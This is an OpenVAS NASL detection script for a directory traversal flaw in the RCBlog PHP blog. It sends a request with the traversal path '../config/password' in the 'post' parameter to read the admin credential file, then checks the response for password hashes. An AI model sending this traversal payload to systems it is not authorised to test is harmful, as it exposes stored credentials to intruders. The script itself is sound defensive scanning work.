# OpenVAS Vulnerability Test
# $Id: rcblog_dir_transversal.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: RCBlog post Parameter Directory Traversal Vulnerability
#
# Authors:
# Josh Zlatin-Amishav josh at ramat dot cc
# Changes by Tenable: reduced the likehood of false positives
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is prone to directory 
traversal attacks.

Description :

The remote host is running RCBlog, a blog written in PHP. 

The remote version of this software fails to sanitize user-supplied
input to the 'post' parameter of the 'index.php' script.  An attacker
can use this to access arbitrary files on the remote host provided
PHP's 'magic_quotes' setting is disabled or, regardless of that
setting, files with a '.txt' extension such as those used by the
application to store administrative credentials.";

tag_solution = "Remove the application as its author no longer supports it.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20825");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2006-0370", "CVE-2006-0371");
  script_bugtraq_id(16342);
  script_xref(name:"OSVDB", value:"22679");
  script_xref(name:"OSVDB", value:"22680");
  script_xref(name:"OSVDB", value:"22681");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("RCBlog post Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2006 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/422499");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

file = "../config/password";

foreach dir( make_list_unique( "/rcblog", "/blog", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string( dir, "/index.php?post=", file );
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;

  # If it looks like it worked.
  if ( string(file, " not found.</div>") >!< res &&
       'powered by <a href="http://www.fluffington.com/">RCBlog' >< res &&
       egrep(pattern:'<div class="title">[a-f0-9]{32}\t[a-f0-9]{32}</div>', string:res) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );